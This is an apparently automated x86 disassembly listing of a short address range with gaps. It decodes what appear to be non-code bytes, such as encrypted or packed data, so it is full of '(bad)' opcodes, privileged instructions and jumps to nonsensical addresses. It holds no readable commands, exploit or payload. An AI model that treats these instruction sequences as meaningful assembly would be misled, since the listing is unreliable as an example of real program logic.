  42d2b8:	cli    
  42d2b9:	lods   al,BYTE PTR ds:[esi]
  42d2ba:	(bad)  
  42d2bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d2bc:	pop    esi
  42d2bd:	add    eax,0x5f865934
  42d2c2:	fdivrp st(7),st
  42d2c4:	fdivr  QWORD PTR [ebx+0xfe6c954]
  42d2ca:	and    al,BYTE PTR [ebx+ebx*8-0x5e]
  42d2ce:	xor    eax,0xcfb69134
  42d2d3:	add    edx,DWORD PTR [edx+0x4c02cc03]
  42d2d9:	cmp    eax,0x860ff7ca
  42d2de:	stos   DWORD PTR es:[edi],eax
  42d2df:	jmp    0x42d33e
  42d2e1:	mov    bh,0xb4
  42d2e3:	inc    eax
  42d2e4:	sti    
  42d2e5:	or     DWORD PTR [esi+0x504b5770],0x4a4e5667
  42d2ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d2f0:	or     DWORD PTR [ecx],eax
  42d2f2:	(bad)  
  42d2f3:	aam    0x57
  42d2f5:	dec    ebp
  42d2f6:	sub    DWORD PTR [esi+0x11],ecx
  42d2f9:	pop    esp
  42d2fa:	or     eax,0xebdfabc1
  42d2ff:	aad    0x83
  42d301:	pop    edi
  42d302:	aad    0xae
  42d304:	shr    DWORD PTR [esi+0x27],cl
  42d307:	add    ecx,DWORD PTR [eax-0x54]
  42d30a:	adc    edx,esp
  42d30c:	stc    
  42d30d:	lods   al,BYTE PTR ds:[esi]
  42d30e:	stos   BYTE PTR es:[edi],al
  42d30f:	fwait
  42d310:	mov    ebp,0x91c49694
  42d315:	rcr    BYTE PTR [esi],0xba
  42d318:	icebp  
  42d319:	and    cl,BYTE PTR [edi]
  42d31b:	jb     0x42d370
  42d31d:	inc    eax
  42d31e:	mov    ch,0xf5
  42d320:	shl    DWORD PTR [esi],1
  42d322:	xor    DWORD PTR [edx],esi
  42d324:	ss jae 0x42d347
  42d327:	ret    0xb643
  42d32a:	inc    esp
  42d32b:	mov    dh,0xf6
  42d32d:	cmp    dl,al
  42d32f:	jne    0x42d34c
  42d331:	adc    DWORD PTR [edx-0x44],eax
  42d334:	sub    BYTE PTR [ebx+0x3bc000f3],0xd9
  42d33b:	daa    
  42d33c:	xor    BYTE PTR ds:0x7188549b,0x3f
  42d343:	hlt    
  42d344:	xchg   ebp,eax
  42d345:	add    eax,0x2161f1c
  42d34a:	stos   DWORD PTR es:[edi],eax
  42d34b:	dec    edx
  42d34c:	mov    edx,0x786d048
  42d351:	xchg   DWORD PTR [edi+0x4e],eax
  42d354:	xchg   esi,eax
  42d355:	jle    0x42d3d5
  42d357:	aam    0xef
  42d359:	or     al,0x96
  42d35b:	pop    es
  42d35c:	call   FWORD PTR [ecx]
  42d35e:	push   edx
  42d35f:	in     eax,dx
  42d360:	pop    esi
  42d361:	out    dx,eax
  42d362:	pop    ds
  42d363:	sub    al,0x6c
  42d365:	test   BYTE PTR [edi-0x42568415],ah
  42d36b:	rcl    BYTE PTR [ebx+0x7b],1
  42d36e:	pop    esp
  42d36f:	xchg   esi,eax
  42d370:	not    ch
  42d372:	in     al,0xae
  42d374:	sub    BYTE PTR [esi+esi*2+0x0],bh
  42d378:	dec    esp
  42d379:	adc    al,0x79
  42d37b:	cmp    al,0x8
  42d37d:	ins    BYTE PTR es:[edi],dx
  42d37e:	into   
  42d37f:	lds    eax,FWORD PTR [eax]
  42d381:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d382:	data16 std 
  42d384:	adc    al,0x7e
  42d386:	sub    DWORD PTR [ecx],0xffffffb5
  42d389:	retf   0xda8b
  42d38c:	inc    edx
  42d38d:	push   eax
  42d38e:	test   al,0x5a
	...
  42d3f4:	ror    esi,0x63
  42d3f7:	cdq    
  42d3f8:	outs   dx,DWORD PTR ds:[esi]
  42d3f9:	mov    ebp,0x9459defb
  42d3fe:	aaa    
  42d3ff:	pushf  
  42d400:	lds    edi,FWORD PTR [esi+0x1f]
  42d403:	pop    ebp
  42d404:	adc    al,0xe4
  42d406:	add    DWORD PTR [eax],eax
  42d408:	add    al,0x1
  42d40a:	add    BYTE PTR [eax],al
  42d40c:	pop    esp
  42d40d:	(bad)  
  42d40e:	mov    ah,0xc9
  42d410:	pop    eax
  42d411:	and    esp,edi
  42d413:	(bad)  
  42d414:	pushf  
  42d415:	push   cs
  42d416:	pop    edi
  42d417:	loope  0x42d494
  42d419:	in     eax,0x1e
  42d41b:	jg     0x42d3ce
  42d41d:	mov    WORD PTR ds:0x63efbfff,?
  42d423:	fucom  st(4)
  42d425:	fdivp  st(6),st
  42d427:	std    
  42d428:	and    bl,ah
  42d42a:	jp     0x42d42a
  42d42c:	xor    al,0x95
  42d42e:	cs push ebx
  42d430:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d431:	in     al,0x79
  42d433:	and    cl,BYTE PTR [esp+edx*1]
  42d436:	imul   edx,DWORD PTR [edx-0x9],0xffffff88
  42d43a:	or     al,0xef
  42d43c:	std    
  42d43d:	lods   al,BYTE PTR ds:[esi]
  42d43e:	sub    BYTE PTR [esi],bh
  42d440:	push   edi
  42d441:	jg     0x42d4be
  42d443:	in     al,dx
  42d444:	lods   al,BYTE PTR ds:[esi]
  42d445:	scas   al,BYTE PTR es:[edi]
  42d446:	sar    BYTE PTR ds:0x7ac926dd,0xd8
  42d44d:	sub    bh,cl
  42d44f:	add    ah,ah
  42d451:	retf   0x4634
  42d454:	fisub  DWORD PTR [edx-0x27]
  42d457:	mov    WORD PTR [ebp+0x35],fs
  42d45a:	xor    al,0x6a
  42d45c:	jge    0x42d41a
  42d45e:	cs sbb eax,0x85e770e1
  42d464:	out    dx,al
  42d465:	and    BYTE PTR [edi+0x43d37d32],cl
  42d46b:	int3   
  42d46c:	cmp    BYTE PTR [edi-0x39],ch
  42d46f:	rcl    DWORD PTR [ecx-0x1814da4f],1
  42d475:	sar    BYTE PTR [edi-0x53e4c10d],0x94
  42d47c:	and    ebx,esi
  42d47e:	pop    esi
  42d47f:	lods   eax,DWORD PTR ds:[esi]
  42d480:	stc    
  42d481:	jg     0x42d4ed
  42d483:	or     dl,cl
  42d485:	leave  
  42d486:	mov    ecx,DWORD PTR [eax+eax*4-0x41772f25]
  42d48d:	stos   BYTE PTR es:[edi],al
  42d48e:	(bad)  
  42d490:	enter  0x5d61,0xda
  42d494:	repnz xor DWORD PTR [ebx-0x6],ebx
  42d498:	sbb    ebx,ecx
  42d49a:	mov    eax,0x2d40c993
  42d49f:	punpcklbw mm3,DWORD PTR [ebp+0x68]
  42d4a3:	test   BYTE PTR [ecx-0x2e],ch
  42d4a6:	cmp    eax,DWORD PTR [esi+0x6de3ee34]
  42d4ac:	sahf   
  42d4ad:	xor    ecx,DWORD PTR [edi+0x3c]
  42d4b0:	push   esp
  42d4b1:	push   cs
  42d4b2:	mov    BYTE PTR [esi],0xa0
  42d4b5:	das    
  42d4b6:	imul   esp,DWORD PTR [esi+0x4165d101],0x96f19258
  42d4c0:	retf   0xea1a
  42d4c3:	fisttp WORD PTR [edi-0x9]
  42d4c6:	in     al,dx
  42d4c7:	rcl    BYTE PTR [esi-0xc],1
  42d4ca:	std    
  42d4cb:	int3   
  42d4cc:	rol    DWORD PTR [ebx],0x8
  42d4cf:	enter  0x1813,0x86
  42d4d3:	aad    0x89
  42d4d5:	push   edi
  42d4d6:	mov    ?,WORD PTR [ecx]
  42d4d8:	xchg   ecx,eax
  42d4d9:	and    DWORD PTR ds:0xfbc336b8,ebx
  42d4df:	repnz aad 0xbc
  42d4e2:	sbb    eax,0x9ab8d595
  42d4e7:	xchg   esp,eax
  42d4e8:	loopne 0x42d4e3
  42d4ea:	cmc    
  42d4eb:	mov    ch,0x97
  42d4ed:	mov    eax,ds:0xcc807c48
  42d4f2:	sbb    edi,DWORD PTR [edi]
  42d4f4:	or     eax,DWORD PTR [ebx]
  42d4f6:	mov    ah,0x8a
  42d4f8:	cmp    cl,BYTE PTR [ebp+0x25]
  42d4fb:	jno    0x42d534
  42d4fd:	pushf  
  42d4fe:	dec    esp
  42d4ff:	nop
  42d500:	push   ecx
  42d501:	sub    eax,DWORD PTR [esp]
  42d504:	cmp    al,0xfe
  42d506:	mov    eax,ds:0x293a96d2
  42d50b:	push   ebx
  42d50c:	(bad)  
  42d50d:	stos   DWORD PTR es:[edi],eax
  42d50e:	stos   BYTE PTR es:[edi],al
  42d50f:	repnz add BYTE PTR [eax],al
	...
  42d572:	add    BYTE PTR [eax],al
  42d574:	cdq    
  42d575:	cmc    
  42d576:	adc    BYTE PTR [ebx-0x12],0x77
  42d57a:	fcos   
  42d57c:	pop    ebp
  42d57d:	mov    ds:0xe40bcd5,eax
  42d583:	fcomp  QWORD PTR [eax]
  42d585:	in     eax,0x1
  42d587:	add    BYTE PTR [ecx+eax*1],al
  42d58a:	add    BYTE PTR [eax],al
  42d58c:	pop    esi
  42d58d:	es jmp 0x42d5b9
  42d590:	popa   
  42d591:	imul   ecx,edx,0x76
  42d594:	jmp    0x42d5a4
  42d596:	xchg   ebp,eax
  42d597:	ficom  WORD PTR [eax-0x62]
  42d59a:	mov    BYTE PTR [eax+0x3f],ch
  42d59d:	enter  0xdb80,0x2f
  42d5a1:	push   0xffffffeb
  42d5a3:	inc    eax
  42d5a4:	aam    0x26
  42d5a6:	aas    
  42d5a7:	jo     0x42d5a2
  42d5a9:	into   
  42d5aa:	dec    eax
  42d5ab:	(bad)  
  42d5ac:	outs   dx,DWORD PTR ds:[esi]
  42d5ad:	xchg   ecx,eax
  42d5ae:	leave  
  42d5af:	jp     0x42d596
  42d5b1:	sbb    eax,DWORD PTR [esi]
  42d5b3:	mov    al,dh
  42d5b5:	jno    0x42d569
  42d5b7:	repnz xor DWORD PTR [ebp+0x385cafc6],ebx
  42d5be:	aad    0xb5
  42d5c0:	mov    dh,0xf5
  42d5c2:	dec    edx
  42d5c3:	stos   DWORD PTR es:[edi],eax
  42d5c4:	xchg   BYTE PTR [edx],ch
  42d5c6:	icebp  
  42d5c7:	sub    ch,BYTE PTR [esi]
  42d5c9:	cwde   
  42d5ca:	inc    esp
  42d5cb:	pop    es
  42d5cc:	pop    ecx
  42d5cd:	pop    esp
  42d5ce:	adc    eax,0x25b9492a
  42d5d3:	or     eax,0xc8261969
  42d5d8:	(bad)  
  42d5da:	(bad)  
  42d5db:	rsm    
  42d5dd:	lods   eax,DWORD PTR ds:[esi]
  42d5de:	jmp    0xe337d697
  42d5e3:	mov    edx,0xc35489ec
  42d5e8:	repz mov esi,0xa8a50493
  42d5ee:	rcl    DWORD PTR [ebx+ecx*1+0x51b5e97c],1
  42d5f5:	xchg   esp,eax
  42d5f6:	repz out dx,al
  42d5f8:	push   ecx
  42d5f9:	leave  
  42d5fa:	adc    eax,0x27bb2fd2
  42d5ff:	adc    edi,DWORD PTR [edi-0x748f5211]
  42d605:	lahf   
  42d606:	cmp    edi,DWORD PTR [esp+edx*2]
  42d609:	xchg   BYTE PTR [edi-0x66e10b0e],dh
  42d60f:	sar    BYTE PTR [esi-0x17],cl
  42d612:	lock aam 0xe1
  42d615:	inc    ebx
  42d616:	sub    al,0x6
  42d618:	fcomp  QWORD PTR [esi]
  42d61a:	mov    ebp,esi
  42d61c:	mov    ds:0xf5f7cf11,al
  42d621:	int3   
  42d622:	pop    ds
  42d623:	aam    0xc6
  42d625:	nop
  42d626:	xchg   DWORD PTR [edi+eiz*8-0x4917590f],esp
  42d62d:	jb     0x42d6a8
  42d62f:	mov    ch,0xbb
  42d631:	mov    ebx,0x5f7938df
  42d636:	cmp    eax,0x810dc6a5
  42d63b:	(bad)  
  42d63c:	ror    DWORD PTR [ebp+0x5645e687],1
  42d642:	cwde   
  42d643:	dec    ebp
  42d644:	cmp    al,0x7d
  42d646:	dec    edx
  42d647:	stos   BYTE PTR es:[edi],al
  42d648:	sub    edx,DWORD PTR [ebp+0x51]
  42d64b:	cwde   
  42d64c:	pop    ds
  42d64d:	mov    dh,0xce
  42d64f:	mov    dh,0x41
  42d651:	cmp    al,0xff
  42d653:	push   eax
  42d654:	or     DWORD PTR [ebp+0xf],eax
  42d657:	and    esi,DWORD PTR [ecx]
  42d659:	xchg   ebx,eax
  42d65a:	scas   al,BYTE PTR es:[edi]
  42d65b:	inc    ecx
  42d65c:	mov    al,ds:0x1e904e14
  42d661:	in     al,dx
  42d662:	add    esp,DWORD PTR [eax+0x7e]
  42d665:	or     DWORD PTR ds:0xab7f9ed,eax
  42d66b:	out    0x44,al
  42d66d:	push   eax
  42d66e:	pop    ecx
  42d66f:	or     al,0x15
  42d671:	xchg   ebx,eax
  42d672:	xchg   ebx,eax
  42d673:	add    ecx,DWORD PTR [ecx-0x22]
  42d676:	and    eax,DWORD PTR [ebp+0x2736ef03]
  42d67c:	mov    BYTE PTR [edx+0x5805a60e],0x17
  42d683:	(bad)  [eax-0x11]
  42d686:	out    dx,al
  42d687:	inc    ebp
  42d688:	call   0xaeb044df
  42d68d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d68e:	(bad)  
  42d68f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
	...
  42d6f4:	repz add esp,DWORD PTR [eax]
  42d6f7:	(bad)  
  42d6f8:	lock scas eax,DWORD PTR es:[edi]
  42d6fa:	(bad)  
  42d6fb:	jg     0x42d67e
  42d6fd:	in     al,0x2c
  42d6ff:	and    al,0xd
  42d701:	aad    0x17
  42d703:	pop    ebp
  42d704:	sbb    al,0xe6
  42d706:	add    DWORD PTR [eax],eax
  42d708:	add    al,0x1
  42d70a:	add    BYTE PTR [eax],al
  42d70c:	jb     0x42d745
  42d70e:	fwait
  42d70f:	mov    esp,0x2363351e
  42d714:	out    dx,eax
  42d715:	shr    BYTE PTR [edi],1
  42d717:	data16 cmc 
  42d719:	loopne 0x42d6ef
  42d71b:	pop    esi
  42d71c:	inc    edx
  42d71d:	shl    DWORD PTR [esi],1
  42d71f:	in     al,0x2
  42d721:	mov    ecx,DWORD PTR [edi+ebx*4]
  42d724:	sbb    eax,0x5ca7416f
  42d729:	cs sbb al,0x72
  42d72c:	daa    
  42d72d:	cmp    DWORD PTR [ebp+0x39],esi
  42d730:	cmc    
  42d731:	jmp    0xf1edf73e
  42d736:	dec    ecx
  42d737:	xchg   ebx,eax
  42d738:	jmp    0x42d77e
  42d73a:	add    edx,eax
  42d73c:	add    dl,dh
  42d73e:	idiv   DWORD PTR [edi]
  42d740:	xchg   DWORD PTR [eax-0x51],ebp
  42d743:	or     DWORD PTR [ebx-0x4],esi
  42d746:	nop
  42d747:	dec    esp
  42d748:	inc    ebp
  42d749:	push   ds
  42d74a:	mov    esi,0x598e35fc
  42d74f:	mov    edx,eax
  42d751:	retf   0xfcbd
  42d754:	dec    edx
  42d755:	mov    edx,0xfa07f145
  42d75a:	or     ecx,ebp
  42d75c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d75d:	fadd   QWORD PTR [ecx]
  42d75f:	test   al,0xcd
  42d761:	nop
  42d762:	retf   0xf8fc
  42d765:	stc    
  42d766:	ficom  WORD PTR [esi-0x3d]
  42d769:	pop    ecx
  42d76a:	and    ebp,DWORD PTR [edx-0x33]
  42d76d:	dec    ebx
  42d76e:	stc    
  42d76f:	mov    ds:0x84c17e0,eax
  42d774:	lods   al,BYTE PTR ds:[esi]
  42d775:	not    DWORD PTR [ebp+0xf]
  42d778:	dec    esi
  42d779:	push   0xfffffff2
  42d77b:	into   
  42d77c:	xchg   ecx,eax
  42d77d:	aam    0x4
  42d77f:	pop    eax
  42d780:	push   ss
  42d781:	pop    es
  42d782:	aas    
  42d783:	mov    esi,0xb59f99d0
  42d788:	add    BYTE PTR [edx+0x64],al
  42d78b:	inc    esp
  42d78c:	shl    DWORD PTR [ebp+0x4f],0x37
  42d790:	jecxz  0x42d774
  42d792:	xchg   ecx,eax
  42d793:	adc    BYTE PTR [esi+0x239248c1],0xec
  42d79a:	sub    al,0x2d
  42d79c:	pop    edi
  42d79d:	mov    DWORD PTR [esi-0x50830b45],ebp
  42d7a3:	sub    al,0x36
  42d7a5:	shr    DWORD PTR [ebx-0x4e],1
  42d7a8:	mov    ss,ebp
  42d7aa:	cwde   
  42d7ab:	add    al,0x55
  42d7ad:	adc    DWORD PTR [eax+0x6c17c6e6],ecx
  42d7b3:	dec    ecx
  42d7b4:	jmp    0x42d800
  42d7b6:	mov    al,0x4
  42d7b8:	jb     0x42d755
  42d7ba:	jp     0x42d7e5
  42d7bc:	push   es
  42d7bd:	fdiv   DWORD PTR [edi-0x39]
  42d7c0:	imul   edx,esi,0xeae1cc7d
  42d7c6:	imul   DWORD PTR [ebx+0x339cf456]
  42d7cc:	pop    ebx
  42d7cd:	pop    es
  42d7ce:	adc    eax,0xffffff8a
  42d7d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d7d2:	std    
  42d7d3:	rol    ebx,0x51
  42d7d6:	retf   
  42d7d7:	(bad)  
  42d7d8:	mov    ch,0xd9
  42d7da:	xor    BYTE PTR ds:0xf39e64f9,0x87
  42d7e1:	mov    ds,edi
  42d7e3:	out    0x85,eax
  42d7e5:	add    DWORD PTR [edi-0x1ca5c689],ebx
  42d7eb:	jecxz  0x42d7b1
  42d7ed:	arpl   WORD PTR [ecx-0x125ce597],cx
  42d7f3:	unpckhps xmm3,XMMWORD PTR [esi+0xa]
  42d7f7:	icebp  
  42d7f8:	pusha  
  42d7f9:	push   0xffffff86
  42d7fb:	div    DWORD PTR [ecx]
  42d7fd:	shr    BYTE PTR [edx+0x6b],cl
  42d800:	gs cmp bl,ah
  42d803:	hlt    
  42d804:	retf   
  42d805:	and    edx,DWORD PTR [edi+0x19]
  42d808:	mov    dh,0x64
  42d80a:	outs   dx,DWORD PTR ds:[esi]
  42d80b:	mov    eax,ds:0xf22265a0
	...
  42d874:	xchg   esi,eax
  42d875:	fwait
  42d876:	cwde   
  42d877:	pop    edi
  42d878:	popf   
  42d879:	pop    edi
  42d87a:	xlat   BYTE PTR ds:[ebx]
  42d87b:	fistp  DWORD PTR ds:0x35c6961a
  42d881:	mov    ecx,0xe7202f03
  42d886:	add    DWORD PTR [eax],eax
  42d888:	add    al,0x1
  42d88a:	add    BYTE PTR [eax],al
  42d88c:	cmp    ebp,0xaeb66865
  42d892:	jmp    0x42d8eb
  42d894:	mov    esi,0x60f3d1ae
  42d899:	stos   DWORD PTR es:[edi],eax
  42d89a:	xor    esp,DWORD PTR [edx+eiz*4-0x32c74fd6]
  42d8a1:	mov    ecx,0xb3328acc
  42d8a6:	jae    0x42d8ac
  42d8a8:	(bad)  
  42d8a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d8aa:	mov    ch,BYTE PTR [edi]
  42d8ac:	out    0x39,eax
  42d8ae:	scas   al,BYTE PTR es:[edi]
  42d8af:	push   esi
  42d8b0:	lea    edi,[edx]
  42d8b2:	aaa    
  42d8b3:	mov    eax,ds:0x8d776a07
  42d8b8:	mov    esi,0x560d7993
  42d8bd:	adc    al,0x9e
  42d8bf:	mov    ah,0xfe
  42d8c1:	aad    0xe3
  42d8c3:	jp     0x42d8ee
  42d8c5:	fs push esi
  42d8c7:	mov    dl,0x50
  42d8c9:	mov    eax,ebp
  42d8cb:	cmp    edx,ebx
  42d8cd:	std    
  42d8ce:	neg    DWORD PTR [eax-0x76]
  42d8d1:	mov    esp,0xaa4437df
  42d8d6:	push   ecx
  42d8d7:	inc    eax
  42d8d8:	or     ecx,DWORD PTR [ebx+ebp*2]
  42d8db:	sbb    BYTE PTR [bx+si+0xc],dh
  42d8df:	xor    BYTE PTR [esi+0x1d],bl
  42d8e2:	inc    esi
  42d8e3:	add    al,0x1e
  42d8e5:	pop    eax
  42d8e6:	pop    esp
  42d8e7:	pop    ss
  42d8e8:	or     eax,DWORD PTR [eax-0x5fa1a8c2]
  42d8ee:	dec    edx
  42d8ef:	mov    ?,ebp
  42d8f1:	sub    BYTE PTR [eax],dh
  42d8f3:	call   FWORD PTR [esi-0x2ab884aa]
  42d8f9:	jns    0x42d88b
  42d8fb:	daa    
  42d8fc:	retf   0xc152
  42d8ff:	push   eax
  42d900:	mov    al,ds:0x7700a92c
  42d905:	loopne 0x42d912
  42d907:	lahf   
  42d908:	inc    eax
  42d909:	dec    ecx
  42d90a:	call   0x1d23d65b
  42d90f:	retf   0x501d
  42d912:	mov    bl,0x12
  42d914:	jbe    0x42d985
  42d916:	mov    al,ds:0x77679436
  42d91b:	mov    bl,0x36
  42d91d:	jne    0x42d8c4
  42d91f:	mov    ds:0xb5210757,al
  42d924:	pop    esi
  42d925:	xor    ebx,DWORD PTR [eax+0x47bfd71e]
  42d92b:	push   ebx
  42d92c:	enter  0x82a7,0x21
  42d930:	test   ah,ah
  42d932:	call   0xb971:0x67e00715
  42d939:	pusha  
  42d93a:	jp     0x42d95e
  42d93c:	loop   0x42d907
  42d93e:	push   ecx
  42d93f:	xchg   BYTE PTR [eax+0x161edfa6],ah
  42d945:	ror    BYTE PTR [esi-0x3910b647],1
  42d94b:	inc    edi
  42d94c:	adc    bl,BYTE PTR [esi+0x63]
  42d94f:	fnstcw WORD PTR [eax-0x48]
  42d952:	lock pop ebp
  42d954:	test   ebx,ebx
  42d956:	ror    BYTE PTR [edx+0x2a],cl
  42d959:	popf   
  42d95a:	mov    cs,WORD PTR gs:[eax]
  42d95d:	stos   BYTE PTR es:[edi],al
  42d95e:	push   edi
  42d95f:	or     DWORD PTR [di+0xb5b],0x5c18b7f9
  42d968:	sbb    esp,DWORD PTR [ebx+0x5f]
  42d96b:	test   eax,0x8fea052b
  42d970:	repnz (bad) 
  42d974:	xlat   BYTE PTR ds:[ebx]
  42d975:	xor    BYTE PTR [ebx+0x5861d585],dl
  42d97b:	mov    esi,0x1eaf246f
  42d980:	and    BYTE PTR [ebx-0x3a46f93f],cl
  42d986:	xchg   edx,edx
  42d988:	mov    cs,WORD PTR [edi-0x5e]
  42d98b:	pop    ss
  42d98c:	es push cs
  42d98e:	mov    al,ds:0x1c
	...
  42d9f3:	add    cl,bh
  42d9f5:	mov    cl,0x70
  42d9f7:	dec    eax
  42d9f8:	js     0x42d9c3
  42d9fa:	stc    
  42d9fb:	mov    cl,0xbf
  42d9fd:	dec    edi
  42d9fe:	int    0xe1
  42da00:	sar    esi,1
  42da02:	mov    bh,0x9e
  42da04:	and    al,0xe8
  42da06:	add    DWORD PTR [eax],eax
  42da08:	add    al,0x1
  42da0a:	add    BYTE PTR [eax],al
  42da0c:	shl    DWORD PTR [ecx],cl
  42da0e:	jmp    0xdf5a:0x5b976528
  42da15:	sbb    BYTE PTR [eax],al
  42da17:	std    
  42da18:	mov    ebx,0xf9d9c2c7
  42da1d:	push   es
  42da1e:	hlt    
  42da1f:	adc    DWORD PTR [ecx+0x6a4e05d8],ebp
  42da25:	retf   
  42da26:	lds    ecx,FWORD PTR [edx-0x78]
  42da29:	test   DWORD PTR [ebp-0x64],ebp
  42da2c:	inc    edx
  42da2d:	idiv   DWORD PTR [ebx+0x25a6a6cd]
  42da33:	dec    ebx
  42da34:	jl     0x42d9ff
  42da36:	stos   DWORD PTR es:[edi],eax
  42da37:	mov    dh,0xe8
  42da39:	mov    DWORD PTR [eax+edi*1+0x53],eax
  42da3d:	or     DWORD PTR [esi],edx
  42da3f:	arpl   di,di
  42da41:	(bad)  
  42da42:	pop    ebx
  42da43:	or     DWORD PTR [edi+0x6707973a],eax
  42da49:	lahf   
  42da4a:	jmp    0x11d2:0xe6debe18
  42da51:	icebp  
  42da52:	pop    esi
  42da53:	mov    ecx,0xc4f6814b
  42da58:	push   cs
  42da59:	scas   eax,DWORD PTR es:[edi]
  42da5a:	cdq    
  42da5b:	into   
  42da5c:	std    
  42da5d:	imul   esi,ebp,0xf1fbef62
  42da63:	adc    al,0x81
  42da65:	mov    cl,0xeb
  42da67:	push   0x8bea0d1d
  42da6c:	ins    BYTE PTR es:[edi],dx
  42da6d:	call   0x6792:0xe89512aa
  42da74:	or     ch,BYTE PTR [esi-0x6d]
  42da77:	mov    edi,DWORD PTR [ecx+0x5016f0b7]
  42da7d:	jnp    0x42dad8
  42da7f:	xchg   edi,eax
  42da80:	cmp    DWORD PTR [ebx-0x2a],eax
  42da83:	mov    al,ds:0xffd90bbb
  42da88:	adc    al,0xfa
  42da8a:	xchg   ebx,eax
  42da8b:	xchg   ebx,eax
  42da8c:	out    dx,al
  42da8d:	out    0x16,eax
  42da8f:	sbb    eax,0xd5989490
  42da94:	and    eax,0xbc4a6cca
  42da99:	cs icebp 
  42da9b:	inc    eax
  42da9c:	call   0x5493e9f9
  42daa1:	pop    edx
  42daa2:	and    ecx,esp
  42daa4:	bound  esp,QWORD PTR [eax+0x4c06c740]
  42daaa:	inc    edx
  42daab:	cmp    DWORD PTR [edi+0x7c],0x63856487
  42dab2:	pop    esi
  42dab3:	rcl    DWORD PTR [ebx+0x1a],0x19
  42dab7:	es mov bl,0xb5
  42daba:	xor    al,0xea
  42dabc:	retf   
  42dabd:	sub    bl,BYTE PTR ds:0x375b17b1
  42dac3:	xor    al,0x3d
  42dac5:	push   ebp
  42dac6:	mov    BYTE PTR [ebx],cl
  42dac8:	das    
  42dac9:	xor    ah,bl
  42dacb:	push   eax
  42dacc:	lds    ebp,FWORD PTR [ebx+0x20692c72]
  42dad2:	pop    ebx
  42dad3:	jnp    0x42db0f
  42dad5:	imul   edx,DWORD PTR [ecx-0x4258e743],0xffffff84
  42dadc:	sbb    edx,DWORD PTR [ecx-0x396a8826]
  42dae2:	fs sbb eax,0x630e5a00
  42dae8:	or     BYTE PTR [ecx+eiz*8-0x30af6ba],0x24
  42daf0:	hlt    
  42daf1:	inc    ch
  42daf3:	mov    eax,ds:0xaa53cbce
  42daf8:	add    edx,esi
  42dafa:	sbb    ebx,DWORD PTR [edi+0x74a532ac]
  42db00:	aad    0x52
  42db02:	mov    ds:0x8805866f,al
  42db07:	fistp  DWORD PTR [edi-0x52]
  42db0a:	push   ss
  42db0b:	pop    edi
  42db0d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42db0e:	leave  
  42db0f:	sub    eax,DWORD PTR [eax]
	...
  42db71:	add    BYTE PTR [eax],al
  42db73:	add    BYTE PTR [eax-0x2093e086],dh
  42db79:	ins    DWORD PTR es:[edi],dx
  42db7a:	repz (bad) 
  42db7c:	fwait
  42db7d:	jns    0x42db1a
  42db7f:	jns    0x42db88
  42db81:	or     edi,DWORD PTR ds:0x1e92859
  42db87:	add    BYTE PTR [ecx+eax*1],al
  42db8a:	add    BYTE PTR [eax],al
  42db8c:	jae    0x42db32
  42db8e:	hlt    
  42db8f:	mov    ah,0x4d
  42db91:	fisubr WORD PTR [ecx-0x48]
  42db95:	xor    BYTE PTR [ecx],bl
  42db97:	dec    ebp
  42db98:	push   edi
  42db99:	mov    ch,0x71
  42db9b:	int3   
  42db9c:	ja     0x42dc06
  42db9e:	xor    ebp,esp
  42dba0:	jnp    0x42db3b
  42dba2:	xchg   edi,eax
  42dba3:	add    DWORD PTR [edx+esi*1-0x65c70e23],eax
  42dbaa:	mov    BYTE PTR [esi+0x53aceb9a],ah
  42dbb0:	adc    ebp,DWORD PTR [eiz*4-0x58b8529f]
  42dbb7:	inc    ebx
  42dbb8:	jmp    0x273d:0xd39dfb5e
  42dbbf:	fcomp  QWORD PTR [ecx+0x3ab2ba13]
  42dbc5:	jbe    0x42db71
  42dbc7:	jmp    0xd8801807
  42dbcc:	loope  0x42dc3a
  42dbce:	pop    edi
  42dbcf:	outs   dx,DWORD PTR ds:[esi]
  42dbd0:	dec    ebp
  42dbd1:	xor    DWORD PTR [edx],ebp
  42dbd3:	fwait
  42dbd4:	pop    edx
  42dbd6:	mov    bl,0x9b
  42dbd8:	leave  
  42dbd9:	sub    ah,BYTE PTR [edi+0x1d]
  42dbdc:	retf   
  42dbdd:	push   0x68
  42dbdf:	mov    dl,0xb1
  42dbe1:	mov    dh,0xc5
  42dbe3:	mov    bl,0x1e
  42dbe5:	adc    eax,0x7549eb08
  42dbea:	jo     0x42dbfc
  42dbec:	pop    esi
  42dbed:	mov    esp,0x7efdf396
  42dbf2:	jge    0x42dc16
  42dbf4:	outs   dx,BYTE PTR ds:[esi]
  42dbf5:	pop    ebx
  42dbf6:	fisubr DWORD PTR [esi-0x45]
  42dbf9:	cli    
  42dbfa:	push   ebp
  42dbfb:	xor    eax,0x6df46571
  42dc00:	out    0xcf,al
  42dc02:	nop
  42dc03:	add    DWORD PTR [eax-0x45ecccbd],eax
  42dc09:	mov    edx,DWORD PTR [ebx+0x2f]
  42dc0c:	xlat   BYTE PTR ds:[ebx]
  42dc0d:	fwait
  42dc0e:	cmc    
  42dc0f:	ins    BYTE PTR es:[edi],dx
  42dc10:	jp     0x42dbb9
  42dc12:	mov    al,ds:0xa5cf82cf
  42dc17:	popa   
  42dc18:	ja     0x42dc38
  42dc1a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42dc1b:	pusha  
  42dc1c:	stos   BYTE PTR es:[edi],al
  42dc1d:	iret   
  42dc1e:	sti    
  42dc1f:	dec    esp
  42dc20:	or     ch,BYTE PTR [edi-0x66]
  42dc23:	pop    eax
  42dc24:	push   esi
  42dc25:	sub    ch,BYTE PTR [ebp+edi*2+0x40]
  42dc29:	dec    esi
  42dc2a:	cmp    bl,dl
  42dc2c:	add    DWORD PTR fs:0x13fde015,ebx
  42dc33:	sti    
  42dc34:	int    0x15
  42dc36:	aaa    
  42dc37:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42dc38:	or     bl,bl
  42dc3a:	cwde   
  42dc3b:	sub    al,BYTE PTR [esi]
  42dc3d:	or     BYTE PTR [ebp+0x2c],0x95
